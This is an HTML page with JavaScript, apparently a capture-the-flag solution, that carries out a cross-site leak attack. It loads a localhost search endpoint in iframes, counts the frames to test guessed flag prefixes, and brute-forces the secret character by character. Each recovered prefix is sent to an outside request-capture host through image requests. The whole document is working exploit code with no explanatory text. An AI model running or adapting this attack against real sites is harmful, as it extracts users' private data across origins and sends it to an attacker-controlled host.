<iframe id="iframe"></iframe>
<img id="img">
<script>
    async function search(query) {
        return new Promise((resolve) => {
            const iframe = document.createElement("iframe");
            iframe.src = "http://localhost:8000/search?query=" + query;
            document.body.appendChild(iframe);
            iframe.onload = () => {
                try {
                    let result = iframe.contentWindow.frames.length;
                    img.src = `https://gscnife.request.dreamhack.games/${result}`;
                    return resolve(result != 0);
                } catch (e) {
                    return resolve(false);
                }
            };
        });
    }

    async function exploit() {
        let chars = "0123456789abcdef}";
        let secret = "DH{22d";

        while (!secret.includes("}")) {
            let found = false;
            let promises = chars.split("").map(c => 
                search(secret + c).then(result => ({char:c, success:result}))
            );
            let results = await Promise.all(promises);

            for (let rslt of results) {
                if (rslt.success) {
                    secret += rslt.char;
                    found = true;
                    img.src = `https://gscnife.request.dreamhack.games/${secret}`;
                    break;
                }
            }

            if (!found) {
                img.src = `https://gscnife.request.dreamhack.games/failed`;
                //break;
            }
        }
    }

    exploit();
</script>